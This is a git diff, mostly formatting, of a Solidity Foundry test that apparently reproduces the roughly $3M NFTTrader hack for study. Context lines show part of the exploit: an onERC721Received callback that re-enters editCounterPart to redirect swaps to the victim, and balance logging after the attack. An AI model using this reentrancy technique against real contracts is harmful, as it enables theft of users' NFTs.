@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~3M (info from hacked.slowmist.io)
 // Attacker : https://etherscan.io/address/0xb1edf2a0ba8bc789cbc3dfbe519737cada034d2d
@@ -66,11 +65,9 @@ interface INFTTrader {
 
     function closeSwapIntent(address _swapCreator, uint256 _swapId) external payable;
 
-    function createSwapIntent(
-        swapIntent memory _swapIntent,
-        swapStruct[] memory _nftsOne,
-        swapStruct[] memory _nftsTwo
-    ) external payable;
+    function createSwapIntent(swapIntent memory _swapIntent, swapStruct[] memory _nftsOne, swapStruct[] memory _nftsTwo)
+        external
+        payable;
 
     function editCounterPart(uint256 _swapId, address _counterPart) external;
 
@@ -187,12 +184,10 @@ contract ContractTest is Test {
         emit log_named_uint("Exploiter CloneX balance after attack", CloneX.balanceOf(address(this)));
     }
 
-    function onERC721Received(
-        address operator,
-        address from,
-        uint256 tokenId,
-        bytes calldata data
-    ) external returns (bytes4) {
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        returns (bytes4)
+    {
         // Flawed function. Lack of reentrancy protection
         NFTTrader.editCounterPart(swapId, victim);
         return this.onERC721Received.selector;
